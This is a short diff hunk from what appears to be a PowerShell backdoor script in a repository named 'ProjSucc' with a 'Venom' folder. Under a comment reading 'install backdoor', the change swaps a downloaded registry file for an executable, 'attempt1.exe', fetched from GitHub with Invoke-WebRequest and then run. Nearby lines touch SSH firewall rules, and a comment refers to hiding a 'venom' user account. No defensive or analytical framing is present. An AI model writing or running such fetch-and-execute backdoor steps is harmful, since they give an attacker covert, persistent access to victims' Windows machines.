@@ -63,7 +63,9 @@ Get-NetFirewallRule -Name *ssh*
 ./wrev.reg; ./calty
 
 #install backdoor
-Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wrev.reg -OutFile "wrev.reg"
+Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master/exe/attempt1.exe -OutFile "attempt1.exe"
+
+./attempt1.exe; ./calty2
 
 # hide venom user
 
